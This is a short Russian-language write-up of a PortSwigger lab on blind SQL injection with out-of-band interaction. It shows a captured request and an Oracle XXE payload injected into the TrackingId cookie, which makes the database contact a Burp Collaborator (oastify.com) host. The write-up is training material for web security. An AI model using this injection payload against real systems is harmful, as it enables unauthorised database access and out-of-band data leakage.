---
title: "Blind SQL injection with out-of-band interaction"
date: 2025-06-13
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-using-out-of-band-oast-techniques/sql-injection/blind/lab-out-of-band"
classes: wide
---

В данной лабе есть уязвимый к **SQL injection** параметр `Cookie`. Запрос к БД запускается асинхронно, поэтому никак не влияет на ответ. Для решения лабы нужно отправить DNS запрос к `Burp Collaborator`.


```
https://0a8500ef03aa5fd281efe8270034003c.web-security-academy.net/
```

## Solution

По заданию известно, что уязвимость находится в `Cookie`. Возьму `GET`-запрос:

```http
GET / HTTP/2
Host: 0a8500ef03aa5fd281efe8270034003c.web-security-academy.net
Cookie: TrackingId=F8R1WWvhijoYZAbM; session=KbXKZqzTaucV6CezahGZai67UgXaWktO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8500ef03aa5fd281efe8270034003c.web-security-academy.net/filter?category=Accessories
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Опыт решения предыдущих лаб подсказывает мне, что уязвимый параметр — это `TrackingId`. Для задания пейлоады подсмотрим на [странице](https://portswigger.net/web-security/sql-injection/cheat-sheet).

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Теперь добавлю к нему домен `Burp Collaborator` и сформирую пейлоад:

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//7pxkd3astpvmpnv6uc9icczxbohf5gt5.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_out-of-band_interaction/1.png){: height="200" .align-center}

Получилось:3 ☕
